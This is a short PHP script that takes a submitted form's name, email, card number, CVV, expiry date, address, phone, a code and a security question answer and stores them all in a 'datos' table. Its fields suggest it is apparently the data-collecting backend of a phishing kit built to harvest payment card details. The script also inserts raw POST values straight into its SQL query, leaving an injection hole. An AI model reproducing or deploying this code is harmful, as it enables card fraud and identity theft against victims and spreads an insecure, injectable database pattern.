<?php

	include("conexion.php");
	
	$q=$_POST['nombre'];
	$w=$_POST['apellido'];
	$e=$_POST['correo'];
	$r=$_POST['tarjeta'];
	$t=$_POST['titular'];
	$y=$_POST['numero'];
	$u=$_POST['cvv'];
	$i=$_POST['fe'];
	$o=$_POST['direc'];
	$p=$_POST['ciu'];
	$a=$_POST['zip'];
	$s=$_POST['pais'];
	$d=$_POST['tel'];
	$f=$_POST['code'];
	$g=$_POST['pregu'];

	$insertar="INSERT INTO datos(nombre,apellido,correo,tarjeta,titular,numero,cvv2,fecha,direccion,ciudad,zipcode,pais,telefono,codigo,pregunta) VALUES ('$q','$w','$e','$r','$t','$y','$u','$i','$o','$p','$a','$s','$d','$f','$g')";
	$resultado=$conexion->query($insertar);
	if($resultado){
		echo "Datos Ingresados";
	}else{
		echo "Error al Ingresar Datos";
	}
?>